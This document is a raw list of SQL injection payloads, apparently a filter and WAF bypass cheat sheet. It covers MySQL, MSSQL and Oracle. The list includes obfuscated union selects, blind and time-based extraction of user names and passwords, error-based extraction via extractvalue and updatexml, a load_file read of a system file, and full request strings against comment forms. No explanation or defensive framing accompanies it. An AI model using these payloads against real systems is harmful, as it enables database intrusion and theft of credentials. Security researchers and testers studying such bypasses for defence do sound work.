?id=123/*/#\*/union/*/#\*/select/*/#\*/1,2,3/*/#\*/from/*/#\*/admin
id=2/*/*/union/*/*/select/*/*/from/*/*/1,2,3
1' unIoN SeLect 1
1' union%0d%0aselect%0d%0a1
1' union%a0select%a01
1' union/**/select/**/1
1' union/**)*/select/**)*/1
1' union/*--*/select/*--*/1
1'/*!5000union*//*!5000select*/1
1' union all select 1
1' union distinct select 1
1' union distinctrow select 1
1e1union select 1 //select user from mysql.user where user = 'root' and 1=1e1union select 1
xx select xxx, 1e1from xxx //select user,password from mysql.user where user = 'root' and 1=1e1union select user,1e1from mysql.user;
(select "/*") union all select xxx from xxx-- */
1' u%nion se%lect 1 (iis asp)
1' u%u006eion se%u006cect 1 (iis asp)
1' \Nunion select 1
001100100010011100100000011101010110111001101001011011110110111000100000011100110110010101101100011001010110001101110100001000000011000100101100001100100010110000110011001011000111010101110011011001010111001000101000001010010010110000110101001011000011011000100000011001100111001001101111011011010010000000100011
?id=74+u%nion+s%elect 1,2,3,4,5,6 from
select{x table_name}from{x information_schema.tables}
SELECT(UNHEX(UNHEX(333532453335324533323335)));
' - (IF(MID(version(),1,1) LIKE 5, BENCHMARK(100000,SHA1('true')), false)) - '
select * from users where id=8E0union select 1,2,3,4,5,6,7,8,9,0
select * from users where id=8.0union select 1,2,3,4,5,6,7,8,9,0
select * from users where id=\Nunion select 1,2,3,4,5,6,7,8,9,0
where id=.1union/*.1*/select-.1
where id=.1union/*.1*/select!.1
where id=.1union/*.1*/select~.1
where id=.1union/*.1*/select(1)
where id=.1union/*.1*/select`host`from mysql.user
where id=.1union/*.1*/select'1'
where id=.1union/*.1*/select"1"
where id=.1union/*.1*/select@1
' - (IF(MID(version(),1,1) LIKE 5, BENCHMARK(100000,SHA1('true')), false)) - '
select * from user where host ='localhost' && 0=0 limit 0,1;
select * from user where host ='localhost' || 1=1 limit 0,1;
select * from(user);
select * from`user`;
'and(true)like(false)union(select(pass)from(users))#
'union [all|distinct] select pass from users#
SELECT 1 FROM dual WHERE 1=1 AND-+-+-+-+~~((1))
' or --+2=- -!!!'2
' or 1 rlike '1
UNION SELECT * FROM ((SELECT 1)a JOIN (SELECT 2)b JOIN (SELECT 3)c)
SELECT * FROM (SELECT * FROM user A JOIN user B USING (Host,User)) C;
' or 'a' = n'a # unicode
' or 'a' = b'1100001 # binary
' or 'a' = x'61 # hexadecimal
' and substr(data,1,1) = 0x61# 0x6162
' and substr(data,1,1) = unhex(61)# unhex(6162)
' and substr(data,1,1) = char(97)# char(97,98)
' and substr(data,1,1) = lower(conv(10,10,36))# 'a'
' and substr(data,1,1) = lower(conv(11,10,36))# 'b'
' and substr(data,1,1) = lower(conv(36,10,36))# 'z'
AND MID(VERSION(),1,1) = '5'
AND SELECT SUBSTR(column_name,1,1) FROM information_schema.columns > 'A'
' and substr(data,1,1) = 'a'#
' and substring(data,1,1) = 'a'#
' and mid(data,1,1) = 'a'#
' and substr(data from 1 for 1) = 'a'#
lpad(data,1,space(1)) // lpad('hi',4,'?') = '??hi'
rpad(data,1,space(1)) // rpad('hi',4,'?') = 'hi??'
left(data,1)
reverse(right(reverse(data),1))
insert(insert(version(),1,0,space(0)),2,222,space(0))
1'and 0x61=(/*foo*/SELECT mid(pass,1,1) from users limit 1,1)and'1
'-if(locate('f',data),1,0)#
length(trim(leading 'a' FROM data)) # length will be shorter
length(replace(data, 'a', '')) # length will be shorter
foo'div count(select`pass`from(users)where mid(pass,1,1)rlike\nlower(conv(10,pi()*pi(),pi()*pi())) )-'0
select * from table where id = 1 AND if((ascii(lower(substring((select user()),$i,1))))!=$s,1,benchmark(2000000,md5(now())))
' - (IF(MID(version(),1,1) LIKE 5, BENCHMARK(100000,SHA1('true')), false)) - '
false !pi() 0 ceil(pi()*pi()) 10 ceil((pi()+pi())*pi()) 20
true !!pi() 1 ceil(pi()*pi())+true 11 ceil(ceil(pi())*version()) 21
true+true 2 ceil(pi()+pi()+version()) 12 ceil(pi()*ceil(pi()+pi())) 22
floor(pi()) 3 floor(pi()*pi()+pi()) 13 ceil((pi()+ceil(pi()))*pi()) 23
ceil(pi()) 4 ceil(pi()*pi()+pi()) 14 ceil(pi())*ceil(version()) 24
floor(version()) 5 ceil(pi()*pi()+version()) 15 floor(pi()*(version()+pi())) 25
ceil(version()) 6 floor(pi()*version()) 16 floor(version()*version()) 26
ceil(pi()+pi()) 7 ceil(pi()*version()) 17 ceil(version()*version()) 27
floor(version()+pi()) 8 ceil(pi()*version())+true 18 ceil(pi()*pi()*pi()-pi()) 28
floor(pi()*pi()) 9 floor((pi()+pi())*pi()) 19 floor(pi()*pi()*floor(pi())) 29
false !pi() 0 ceil(pi()*pi()) 10 A ceil((pi()+pi())*pi()) 20 K
true !!pi() 1 ceil(pi()*pi())+true 11 B ceil(ceil(pi())*version()) 21 L
true+true 2 ceil(pi()+pi()+version()) 12 C ceil(pi()*ceil(pi()+pi())) 22 M
floor(pi()) 3 floor(pi()*pi()+pi()) 13 D ceil((pi()+ceil(pi()))*pi()) 23 N
ceil(pi()) 4 ceil(pi()*pi()+pi()) 14 E ceil(pi())*ceil(version()) 24 O
floor(version()) 5 ceil(pi()*pi()+version()) 15 F floor(pi()*(version()+pi())) 25 P
ceil(version()) 6 floor(pi()*version()) 16 G floor(version()*version()) 26 Q
ceil(pi()+pi()) 7 ceil(pi()*version()) 17 H ceil(version()*version()) 27 R
floor(version()+pi()) 8 ceil(pi()*version())+true 18 I ceil(pi()*pi()*pi()-pi()) 28 S
floor(pi()*pi()) 9 floor((pi()+pi())*pi()) 19 J floor(pi()*pi()*floor(pi())) 29 T
?act=buy&id=1%0AAND 1=user
?did=2%0Aand/**/(select%0Auser())=”
?did=-2%0Aunion–%0Aselect%0Auser()
?query=1%27>(select.``.schema_name from (select.``.schema_name,if(ascii(mid((select * from test.flag),1,1))=102,(benchmark(5000000,sha(1))),1) from information_schema.schemata)x)%23
?query=1' || if(ascii(substr((/*!select*/ */*a!*/from test.flag),1,1))=97,1,0)%23
/?id=123/*\~500001/*/union/*\~500001/*/select/*\~500001/*/1,2,3
?id=1 ^ (select(ascii((substring((select db_name(1)) ,1,1)))))-108
?id=2 | (select(ascii((substring((select db_name(1)) ,1,1)))))-108
?spm=5176.100241.0.0.eViKRY?id=1%20union%23%0Aselect%20user%20from%20ddd
?id=1'0x00and0x00select0x00*0x00from0x00
1' union distinctrow select/*!USER*/(),/*!DATABASE*/()#
' union distinctrow select unhex('352E352E34322D6C6F67'),unhex('726F6F74406C6F63616C686F7374')#
1' union distinctrow select/*!USER*/(),/*!DATABASE*/()/*f*//*r*//*o*//*m*/users#
id=union /*!50001select*/ * from ddd
1' /*!UNION/**//**/ALL*//*!SELECT*//*!USER*/(),/*!USER*/()#
inject_string=--%00%27+union%20select%20GROUP_CONCAT(DISTINCT%20table_name)%20from%20information_schema.tables%20where%20table_schema=0x73716C6F6C%23+&sanitize_quotes=none&blacklist_level=none&blacklist_keywords=&query_results=all_rows&error_level=verbose&location=where_string&submit=%D7%A2%C9%E4%21
inject_string=--%00%27+union%20select%20GROUP_CONCAT(DISTINCT%20table_name)%20from%20information_schema.tables%20where%20table_schema=0x73716C6F6C%23+&sanitize_quotes=none&blacklist_level=none&blacklist_keywords=&query_results=all_rows&error_level=verbose&location=where_string&submit=%D7%A2%C9%E4%21
id=%20--%20%27%20union%20select%201,2%20from%20users%23
id=' -- ') union select user,database() from users %23&Submit=Submit#
id=/*' union select 1,2 from users%23*/
id='select xx /*from*/``%23
id=/*%27%20union%20select%201,2,3,4%20from%20admin%23*/
id=1/*/\*/and/*/\*/ascii%28substring%28user%28%29,1,1%29%29=114
id=1/*/\*/and/*/\*/ascii%28substring%28user%28%29,2,1%29%29=111 http://localhost/sql.php?id=1/*/\*/and/*/\*/ascii%28substring%28user%28%29,3,1%29%29=111 http://localhost/sql.php?id=1/*/\*/and/*/\*/ascii%28substring%28user%28%29,4,1%29%29=116
99999=(select 1 as '/*') union all select 1 as '*//*',2,3,4,5 from mysql.user as `x*/`%23
.and 1=(select "/*") union all select 1,@@version,3,4,5 from mysql.user-- */
union all /*!/*!select*/1 as %27*/%27,2,3,4,5 from mysql.user%23
xxx'and'0'=(select 1 as [/*]) union all select 1,2,3,4,5,6 from [test] as [*/]--
.and 0=(select 1 as [/*]) union all select 1,2,3,4,5,6 from [test] as [*/]--
.and 0=(select top 1 1 as [/*] from admin as [*//*]) union all select 1 as [*//*],2,username,password,5 from admin as [*/]
xxx'and'0'=(select top 1 '1' as [/*] from admin as [*//*]) union all select 1 as [*//*],2,username,password,5 from admin as [*/]
.and 1=(select 1 as "/*" from dual) union all select 1,2,3,4,5 from dual-- */
xxx'and'a'=(select '/*' from dual) union all select 1,2,3 from dual where '*/'='*/'
99999=(select 1 as '--+') union all select 1,2,3,4,5 from mysql.user%23
99999=(select '--+') union all select 1,2,3,4,5 from mysql.user%23
%2b'--+' union all select 1,'haha',3,4,5 from mysql.user%23
/*--+/*x/*/union all select 1,@@version,@@datadir,4,5 from mysql.user%23
99999=(select{`--+`1}) union all select 1,2,3,4,5 from mysql.user%23
99999=(/*!select--*/1) union all select 1,2,3,4,5 from mysql.user%23
9999.and '1'=(select '-- ') union all select 1,2,3
xxx'and'1'=(select '-- ') union all select 1,2,3
xxx'%2b'--+'union all select 1,2,3
.and '0'=(select top 1 '--+' from admin) union all select 1,2,3 from admin
.and'a'%2b'--+'union all select 1,2,3 from admin
.and 0=(select 1 as "--+") union all select 1,2,3 from dual--
and'a'=(select '--+' from dual) union all select 1,2,3,4,5 from dual--
Q=1' UNION ALL SELECT NULL,NULL,NULL,NULL,CHR(113)||CHR(107)||CHR(112)||CHR(106)||CHR(113)||NVL(CAST(OWNER AS VARCHAR(4000)),CHR(32))||CHR(113)||CHR(112)||CHR(118)||CHR(112)||CHR(113) FROM (SELECT DISTINCT(OWNER) FROM SYS.ALL_TABLES)--
Q=%u0031%u0027%u0020%u0055%u004E%u0049%u004F%u004E%u0020%u0041%u004C%u004C%u0020%u0053%u0045%u004C%u0045%u0043%u0054%u0020%u004E%u0055%u004C%u004C%u002C%u004E%u0055%u004C%u004C%u002C%u004E%u0055%u004C%u004C%u002C%u004E%u0055%u004C%u004C%u002C%u0043%u0048%u0052%u0028%u0031%u0031%u0033%u0029%u007C%u007C%u0043%u0048%u0052%u0028%u0031%u0030%u0037%u0029%u007C%u007C%u0043%u0048%u0052%u0028%u0031%u0031%u0032%u0029%u007C%u007C%u0043%u0048%u0052%u0028%u0031%u0030%u0036%u0029%u007C%u007C%u0043%u0048%u0052%u0028%u0031%u0031%u0033%u0029%u007C%u007C%u004E%u0056%u004C%u0028%u0043%u0041%u0053%u0054%u0028%u004F%u0057%u004E%u0045%u0052%u0020%u0041%u0053%u0020%u0056%u0041%u0052%u0043%u0048%u0041%u0052%u0028%u0034%u0030%u0030%u0030%u0029%u0029%u002C%u0043%u0048%u0052%u0028%u0033%u0032%u0029%u0029%u007C%u007C%u0043%u0048%u0052%u0028%u0031%u0031%u0033%u0029%u007C%u007C%u0043%u0048%u0052%u0028%u0031%u0031%u0032%u0029%u007C%u007C%u0043%u0048%u0052%u0028%u0031%u0031%u0038%u0029%u007C%u007C%u0043%u0048%u0052%u0028%u0031%u0031%u0032%u0029%u007C%u007C%u0043%u0048%u0052%u0028%u0031%u0031%u0033%u0029%u0020%u0046%u0052%u004F%u004D%u0020%u0028%u0053%u0045%u004C%u0045%u0043%u0054%u0020%u0044%u0049%u0053%u0054%u0049%u004E%u0043%u0054%u0028%u004F%u0057%u004E%u0045%u0052%u0029%u0020%u0046%u0052%u004F%u004D%u0020%u0053%u0059%u0053%u002E%u0041%u004C%u004C%u005F%u0054%u0041%u0042%u004C%u0045%u0053%u0029%u002D%u002D%u0020
id=/*!SELECT*//*!CONCAT*/(0x7176626a71,(MID((/*!IFNULL*/(CAST(/*!CURRENT_USER*/()/*!AS*//*!CHAR*/),0x20)),1,50)),0x7170767871)
id=/**//**/union/**//**/%0A/*!SeLEct*/%0A/**/*/**//*!From*/%0A/**/user
id=0%23%0AAND%23%0A1=1
a=/*66666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666*/&threadid=14669&action=reply&page=1%20and%201=1 and 1=1
union select (select{x user}from{1d admin}+limit+1),1
1' and if(ascii(substr((select{1d user()}),1,1))>11,sleep(1),1)
and--!!!1=- -!!!1
and--!!!1=- -!!!0
%26%261=1
%26%261=0
||1=0
extractvalue(rand(0),concat(0x0a,version()))
extractvalue(floor(0),concat(0x0a,version()))
extractvalue(rand(0),concat(0x0a,unhex(hex(user()))))
extractvalue(floor(0),concat(0x0a,unhex(hex(user()))))
extractvalue(rand(0),convert(user() using latin1))
updatexml(1,repeat(user(),2),1)
updatexml(0,concat(0xa,user()),0)
updatexml(0,lpad(.1,350,hex(hex(user()))),1)
updatexml(1,concat('/',user()),1)
validate=SEYY&action=send&comtype=comments&fid=1&isconfirm=yes&msg=90sec&typeid=0','3','4','5','0','1351739660', '0','0','0','0','0','aaaaaa'),('1544','2',@`'`,'4','5','1','1351739660', '0','0','0','0','0',(select(select passwordxxxxfromxxxadmin limit 1)))%23
validate=SEYY&action=send&comtype=comments&fid=1&isconfirm=yes&msg=90sec&typeid=0','3','4','5','0','1351739660', '0','0','0','0','0','aaaaaa'),('1544','2',@`'`,'4','5','1','1351739660', '0','0','0','0','0',(select(select password from%a0admin limit 1)))%23
(select(select{x pwd}from{x %23@__admin}+limit+1)
validate=SEYY&action=send&comtype=comments&fid=1&isconfirm=yes&msg=90sec&typeid=0','3','4','5','0','1351739660', '0','0','0','0','0','aaaaaa'),('1534','2',@`'`,'4','5','1','1351739660', '0','0','0','0','0','x' update(select(select{x%0acomment}from{x%0aguestbook}limit 1))%23
select{x%0acomment}from{x%0aguestbook}limit 1
id=4+and%23fuck%0a1=2+union+%23qa%0Aselect+1,2,3,4,5,6,7,8,9,10
id=4+and%23fuck%0a1=2+union+%23qa%0Aselect+1,(load_file(0x433a5c57494e444f57535c73797374656d33325c647269766572735c6574635c686f737473)),3,4,5,6,7,8,9,10
union /*!50000select/*!*/ name from test#
validate=SEYY&action=send&comtype=comments&fid=1&isconfirm=yes&msg=90sec&typeid=0','3','4','5','0','1351739660', '0','0','0','0','0','aaaaaa'),('1534','2',@`'`,'4','5','1','1351739660', '0','0','0','0','0',(select(select{x pwd}from{x %23@__admin}+limit+1)))%23
validate=SEYY&action=send&comtype=comments&fid=1&isconfirm=yes&msg=90sec&typeid=0','3','4','5','0','1351739660', '0','0','0','0','0','aaaaaa'),('1534','2',@`'`,'4','5','1','1351739660', '0','0','0','0','0','x' update (select(select{x pwd}from{x %23@__admin}+limit+1)))%23
insert into users (user_id,first_name) values(18,(select(select{x name}from{x guestbook}limit 1)))#test
select{x pwd}from{x %23@admin}limit 1)
sql=select%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%2a%20from%20manager
id=08Eunion select
id=08Eunion select 1,2,3%23
id=08Eunion select user fr1om/*./*/admin%23
id=8E0union/*.1*/select{x user}from{x users}%23
d=1 union/*.1*/select user from%a0admin%23
id=49 %u0061nd 1=1
id=49 %u0061nd 1=2
id=49 %u0061nd 1=2 un%u0069on se%u006c%u0065ct 1,2,3,4,5 from admin